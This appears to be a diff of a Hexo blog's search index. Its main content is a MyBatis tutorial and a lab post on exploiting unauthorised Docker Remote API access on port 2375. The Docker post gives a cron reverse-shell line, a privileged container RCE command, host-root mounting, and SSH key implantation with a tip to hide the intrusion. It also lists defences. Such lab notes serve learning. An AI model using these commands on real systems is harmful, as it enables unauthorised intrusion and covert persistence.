@@ -279,6 +279,11 @@
       </tags>
   </entry>
   <entry>
+    <title>dnslog盲打</title>
+    <url>/2021/09/18/dnslog%E7%9B%B2%E6%89%93/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
     <title>ctfhub之ssrf</title>
     <url>/2021/07/19/ctfhub%E4%B9%8Bssrf/</url>
     <content><![CDATA[<h1 id="ctfshow之ssrf"><a href="#ctfshow之ssrf" class="headerlink" title="ctfshow之ssrf"></a>ctfshow之ssrf</h1><h2 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h2><h2 id="内网访问（http协议）"><a href="#内网访问（http协议）" class="headerlink" title="内网访问（http协议）"></a>内网访问（http协议）</h2><p>尝试访问位于127.0.0.1的flag.php吧</p>
@@ -316,11 +321,6 @@
       </tags>
   </entry>
   <entry>
-    <title>dnslog盲打</title>
-    <url>/2021/09/18/dnslog%E7%9B%B2%E6%89%93/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
     <title>docker remote api未授权访问</title>
     <url>/2021/12/08/docker-remote-api%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</url>
     <content><![CDATA[<h2 id="Docker-Remote-API-未授权访问"><a href="#Docker-Remote-API-未授权访问" class="headerlink" title="Docker Remote API 未授权访问"></a>Docker Remote API 未授权访问</h2><h3 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h3><p>docker swarm是管理docker集群的工具，主从管理默认通过端口2375通信</p>
@@ -342,8 +342,7 @@
 <p>将宿主机的根目录挂载到镜像id为c059bfaa849c的/mnt目录下</p>
 <p><code>docker -H tcp://靶机:2375 run -it -v /:/mnt 镜像id sh</code></p>
 <p><img src="https://s2.loli.net/2021/12/08/QLwq3DyY5GBUgsX.png" alt="image-20211207160516702"></p>
-<p>直接反弹shell&amp;定时任务反弹shell</p>
-<p><code>echo &#39;* * * * * bash -i &gt;&amp; /dev/tcp/ip/8888 0&gt;&amp;1&#39; &gt;&gt; /test/var/spool/cron/root</code></p>
+<h5 id="直接反弹shell-amp-定时任务反弹shell"><a href="#直接反弹shell-amp-定时任务反弹shell" class="headerlink" title="直接反弹shell&amp;定时任务反弹shell"></a>直接反弹shell&amp;定时任务反弹shell</h5><p><code>echo &#39;* * * * * bash -i &gt;&amp; /dev/tcp/ip/8888 0&gt;&amp;1&#39; &gt;&gt; /test/var/spool/cron/root</code></p>
 <p><img src="https://s2.loli.net/2021/12/08/F6MD29f7tgGAvPp.png" alt="image-20211207164406870"></p>
 <p>已经确认防火墙关闭并且端口开放，但是仍然反弹不了</p>
 <p><code>bash -i &gt;&amp; /dev/tcp/ip/8888 0&gt;&amp;1 </code></p>
@@ -369,6 +368,7 @@
 </blockquote>
 <p>直接rce的payload</p>
 <p><code>docker -H ip:2375 run --rm -it --privileged --net=host -v /:/mnt alpine</code></p>
+<p>未成功</p>
 <h4 id="公私钥提权"><a href="#公私钥提权" class="headerlink" title="公私钥提权"></a>公私钥提权</h4><p>攻击者生成一对公私钥</p>
 <p><code> ssh-keygen -t rsa</code></p>
 <p>输入密钥名和密码</p>
@@ -379,7 +379,11 @@
 <p><code>ssh -i 私钥文件 root@公钥文件所在ip</code></p>
 <p>ps:</p>
 <p>这里可以先保存下对方原来的公钥，等利用公私钥登录权限维持后再给对方换回去，以隐匿操作</p>
-<h3 id="防御策略"><a href="#防御策略" class="headerlink" title="防御策略"></a>防御策略</h3><h3 id="踩坑记录"><a href="#踩坑记录" class="headerlink" title="踩坑记录"></a>踩坑记录</h3><ul>
+<h3 id="防御策略"><a href="#防御策略" class="headerlink" title="防御策略"></a>防御策略</h3><ul>
+<li>禁止外网访问或是设置白名单</li>
+<li>在内网中也要设置严格的访问规则，使用TLS认证</li>
+</ul>
+<h3 id="踩坑记录"><a href="#踩坑记录" class="headerlink" title="踩坑记录"></a>踩坑记录</h3><ul>
 <li>docker中进入的容器有一部分使用的是sh的shell</li>
 <li>反弹shell先要在vps上开启监听</li>
 <li>挂载之后也没有找到root/.ssh目录下的公钥文件</li>
@@ -392,6 +396,8 @@
 <li>可能不是使用的bash、而是sh或其他</li>
 </ul>
 <p><a href="https://blog.csdn.net/qq_41874930/article/details/109216506">docker逃逸的几种方法以及其原理</a></p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://blog.csdn.net/qq_41874930/article/details/109216506">docker逃逸的几种方法以及其原理</a></p>
+<p><a href="https://blog.csdn.net/Aaron_Miller/article/details/107761955">Docker未授权访问漏洞</a></p>
 ]]></content>
       <tags>
         <tag>docker</tag>
@@ -698,6 +704,112 @@
       </tags>
   </entry>
   <entry>
+    <title>mybatis</title>
+    <url>/2021/11/23/mybatis/</url>
+    <content><![CDATA[<h1 id="Mybatis"><a href="#Mybatis" class="headerlink" title="Mybatis"></a>Mybatis</h1><p>环境</p>
+<ul>
+<li>jdk 1.8</li>
+<li>mysql 5.7</li>
+<li>maven 3.6.1</li>
+<li>idea</li>
+</ul>
+<p>回顾</p>
+<ul>
+<li>jdbc</li>
+<li>mysql</li>
+<li>java基础</li>
+<li>maven</li>
+<li>Junit</li>
+</ul>
+<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><ul>
+<li>持久层框架</li>
+<li>避免了几乎所有的jdbc代码和手动设置参数以及获取结果集</li>
+<li>可以使用简单的xml或注解来配置和映射原生类型、接口和java的pojo为数据库中的记录</li>
+</ul>
+<p>maven仓库</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.mybatis/mybatis --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="1-持久化"><a href="#1-持久化" class="headerlink" title="1.持久化"></a>1.持久化</h3><p>数据持久化</p>
+<ul>
+<li>将程序的数据在持久状态和瞬时状态转化的过程</li>
+<li>内存：断电即失</li>
+<li>数据库（jdbc），io文件持久化</li>
+<li>类比于生活中的冰箱的冷藏</li>
+</ul>
+<h3 id="2-持久层"><a href="#2-持久层" class="headerlink" title="2.持久层"></a>2.持久层</h3><p>dao层、service层、controller层</p>
+<ul>
+<li>完成持久化工作的代码</li>
+<li>层界限十分明显</li>
+</ul>
+<blockquote>
+<p>为什么要使用？</p>
+</blockquote>
+<ul>
+<li><p>方便将数据存到数据库中</p>
+</li>
+<li><p>简化（解除sql与代码的耦合，sql与代码分离）、自动化、框架</p>
+</li>
+</ul>
+<h2 id="二、第一个mybatis程序"><a href="#二、第一个mybatis程序" class="headerlink" title="二、第一个mybatis程序"></a>二、第一个mybatis程序</h2><p><img src="https://i.loli.net/2021/11/26/1T7ZQvEaIoK3wUF.png" alt="image-20211126145702942"></p>
+<blockquote>
+<p>搭建环境–&gt;导入mybatis–&gt;编写代码–&gt;测试</p>
+</blockquote>
+<p>工具类（utils–MybatisUtils）–&gt; 配置文件（resources–mybatis-config.xml）–&gt; 实体类（User）–&gt;接口（UserDao）–&gt;Mapper.xml –&gt;测试类</p>
+<h3 id="1-搭建环境"><a href="#1-搭建环境" class="headerlink" title="1.搭建环境"></a>1.搭建环境</h3><ul>
+<li><p>创建数据库</p>
+</li>
+<li><p>新建项目</p>
+</li>
+</ul>
+<ol>
+<li>创建普通maven项目</li>
+<li>删除src目录</li>
+<li>导入maven依赖</li>
+</ol>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--导入依赖--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        mysql驱动--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.49<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        mybatis--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        Junit--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="2-创建模块"><a href="#2-创建模块" class="headerlink" title="2.创建模块"></a>2.创建模块</h3><ul>
+<li>编写mybatis核心配置类</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">configuration</span></span></span><br><span class="line"><span class="meta">        <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--configuration核心配置文件--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">environments</span> <span class="attr">default</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">&quot;JDBC&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;POOLED&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;jdbc:mysql://localhost:3306/mybatis?useSSL=true<span class="symbol">&amp;amp;</span>useUnicode=true<span class="symbol">&amp;amp;</span>characterEncoding=UTF-8&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">environments</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>编写mybatis工具类</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//工厂模式</span></span><br><span class="line"><span class="comment">// sqlSessionFactory --&gt;sqlSession</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MybatisUtils</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> SqlSessionFactory sqlSessionFactory;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//使用mybatis，第一步获取sqlSessionFactory对象</span></span><br><span class="line">            String resource = <span class="string">&quot;mybatis-config.xml&quot;</span>;</span><br><span class="line">            InputStream inputStream = Resources.getResourceAsStream(resource);</span><br><span class="line">            sqlSessionFactory = <span class="keyword">new</span> SqlSessionFactoryBuilder().build(inputStream);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//既然有了 SqlSessionFactory，顾名思义，我们可以从中获得 SqlSession 的实例</span></span><br><span class="line">    <span class="comment">// SqlSession 提供了在数据库执行 SQL 命令所需的所有方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> SqlSession <span class="title">getSqlSession</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sqlSessionFactory.openSession();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="3-编写代码"><a href="#3-编写代码" class="headerlink" title="3.编写代码"></a>3.编写代码</h3><ul>
+<li>实体类</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//实体类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> uid;</span><br><span class="line">    <span class="keyword">private</span> String uname;</span><br><span class="line">    <span class="keyword">private</span> String upassword;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">(<span class="keyword">int</span> uid, String uname, String upassword)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.uid = uid;</span><br><span class="line">        <span class="keyword">this</span>.uname = uname;</span><br><span class="line">        <span class="keyword">this</span>.upassword = upassword;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getUid</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> uid;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUid</span><span class="params">(<span class="keyword">int</span> uid)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.uid = uid;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUname</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> uname;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUname</span><span class="params">(String uname)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.uname = uname;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUpassword</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> upassword;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUpassword</span><span class="params">(String upassword)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.upassword = upassword;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>dao接口</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserDao</span> </span>&#123;</span><br><span class="line">    <span class="function">List&lt;User&gt; <span class="title">getUserList</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>接口实现类</li>
+</ul>
+<p>由原来的UserDaoImpl转变为一个Mapper.xml配置文件</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">mapper</span></span></span><br><span class="line"><span class="meta">        <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--namespace==绑定一个对应的Dao/Mapper接口--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.nuc.dao.UserDao&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getUserList&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.nuc.pojo.User&quot;</span>&gt;</span></span><br><span class="line">    select * from mybatis.user</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="4-测试"><a href="#4-测试" class="headerlink" title="4.测试"></a>4.测试</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserDaoTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//第一步：获得SqlSession对象</span></span><br><span class="line">        SqlSession sqlSession = MybatisUtils.getSqlSession();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//执行sql</span></span><br><span class="line">        <span class="comment">//方式一：getMapper</span></span><br><span class="line">        UserDao userDao = sqlSession.getMapper(UserDao.class);</span><br><span class="line">        List&lt;User&gt; userList = userDao.getUserList();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//方式二：(不推荐使用)</span></span><br><span class="line"><span class="comment">//        List&lt;User&gt; userList1 = sqlSession.selectList(&quot;com.nuc.dao.UserDao.getUserList&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (User user : userList) &#123;</span><br><span class="line">            System.out.println(user);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//关闭SqlSession</span></span><br><span class="line">        sqlSession.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+<h3 id="踩坑记录"><a href="#踩坑记录" class="headerlink" title="踩坑记录"></a>踩坑记录</h3><ol>
+<li>缺少配置文件<code>MapperRegistry</code></li>
+</ol>
+<p><code>org.apache.ibatis.binding.BindingException: Type interface com.nuc.dao.UserDao is not known to the MapperRegistry.</code></p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--    每一个Mapper.xml都要在mybatis核心配置中注册--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span class="string">&quot;com/nuc/dao/UserMapper.xml&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>Mapper.xml位置问题</li>
+</ol>
+<p><img src="https://i.loli.net/2021/11/26/TgmAL61Dhy97pBa.png" alt="image-20211126145303021"></p>
+<p>从dao里面移动到resources中</p>
+]]></content>
+      <tags>
+        <tag>mybatis</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>hexo初使用</title>
     <url>/2021/05/04/hexo%E5%88%9D%E4%BD%BF%E7%94%A8/</url>
     <content><![CDATA[<blockquote>
@@ -817,112 +929,6 @@
       </categories>
       <tags>
         <tag>redis</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>mybatis</title>
-    <url>/2021/11/23/mybatis/</url>
-    <content><![CDATA[<h1 id="Mybatis"><a href="#Mybatis" class="headerlink" title="Mybatis"></a>Mybatis</h1><p>环境</p>
-<ul>
-<li>jdk 1.8</li>
-<li>mysql 5.7</li>
-<li>maven 3.6.1</li>
-<li>idea</li>
-</ul>
-<p>回顾</p>
-<ul>
-<li>jdbc</li>
-<li>mysql</li>
-<li>java基础</li>
-<li>maven</li>
-<li>Junit</li>
-</ul>
-<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><ul>
-<li>持久层框架</li>
-<li>避免了几乎所有的jdbc代码和手动设置参数以及获取结果集</li>
-<li>可以使用简单的xml或注解来配置和映射原生类型、接口和java的pojo为数据库中的记录</li>
-</ul>
-<p>maven仓库</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.mybatis/mybatis --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<h3 id="1-持久化"><a href="#1-持久化" class="headerlink" title="1.持久化"></a>1.持久化</h3><p>数据持久化</p>
-<ul>
-<li>将程序的数据在持久状态和瞬时状态转化的过程</li>
-<li>内存：断电即失</li>
-<li>数据库（jdbc），io文件持久化</li>
-<li>类比于生活中的冰箱的冷藏</li>
-</ul>
-<h3 id="2-持久层"><a href="#2-持久层" class="headerlink" title="2.持久层"></a>2.持久层</h3><p>dao层、service层、controller层</p>
-<ul>
-<li>完成持久化工作的代码</li>
-<li>层界限十分明显</li>
-</ul>
-<blockquote>
-<p>为什么要使用？</p>
-</blockquote>
-<ul>
-<li><p>方便将数据存到数据库中</p>
-</li>
-<li><p>简化（解除sql与代码的耦合，sql与代码分离）、自动化、框架</p>
-</li>
-</ul>
-<h2 id="二、第一个mybatis程序"><a href="#二、第一个mybatis程序" class="headerlink" title="二、第一个mybatis程序"></a>二、第一个mybatis程序</h2><p><img src="https://i.loli.net/2021/11/26/1T7ZQvEaIoK3wUF.png" alt="image-20211126145702942"></p>
-<blockquote>
-<p>搭建环境–&gt;导入mybatis–&gt;编写代码–&gt;测试</p>
-</blockquote>
-<p>工具类（utils–MybatisUtils）–&gt; 配置文件（resources–mybatis-config.xml）–&gt; 实体类（User）–&gt;接口（UserDao）–&gt;Mapper.xml –&gt;测试类</p>
-<h3 id="1-搭建环境"><a href="#1-搭建环境" class="headerlink" title="1.搭建环境"></a>1.搭建环境</h3><ul>
-<li><p>创建数据库</p>
-</li>
-<li><p>新建项目</p>
-</li>
-</ul>
-<ol>
-<li>创建普通maven项目</li>
-<li>删除src目录</li>
-<li>导入maven依赖</li>
-</ol>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--导入依赖--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        mysql驱动--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.49<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        mybatis--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        Junit--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<h3 id="2-创建模块"><a href="#2-创建模块" class="headerlink" title="2.创建模块"></a>2.创建模块</h3><ul>
-<li>编写mybatis核心配置类</li>
-</ul>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">configuration</span></span></span><br><span class="line"><span class="meta">        <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--configuration核心配置文件--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">environments</span> <span class="attr">default</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">&quot;JDBC&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;POOLED&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">value</span>=<span 